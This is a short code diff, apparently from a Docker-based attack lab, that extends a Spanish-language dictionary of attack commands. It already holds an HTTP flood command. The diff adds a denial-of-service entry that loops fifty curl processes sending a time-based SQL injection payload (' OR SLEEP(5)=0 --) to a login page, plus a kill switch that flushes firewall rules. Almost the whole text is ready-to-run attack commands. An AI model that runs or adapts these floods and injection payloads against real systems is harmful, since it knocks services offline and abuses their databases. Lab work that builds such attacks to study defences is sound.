@@ -12,6 +12,9 @@ ATAQUES = {
     
     "http": "docker exec atacante sh -c 'for i in $(seq 1 20); do while true; do curl -s http://172.20.10.10 -o /dev/null; done & done; wait'",
     
+    # Capa 7: SQL Injection DoS (Sleep) - Agota TODO el pool de conexiones en bucle
+    "sqli_dos": "docker exec atacante sh -c 'for i in $(seq 1 50); do while true; do curl -s -X POST -d \"usuario=%27+OR+SLEEP(5)%3D0+--+\" http://172.20.10.10/login.php > /dev/null; done & done'",
+
     # Botón de Pánico: Mata todos los procesos y LIMPIA EL FIREWALL del atacante
     "stop": "docker exec atacante pkill hping3; docker exec atacante pkill curl; docker exec atacante pkill nc; docker exec atacante pkill sh; docker exec atacante iptables -F OUTPUT"
 }
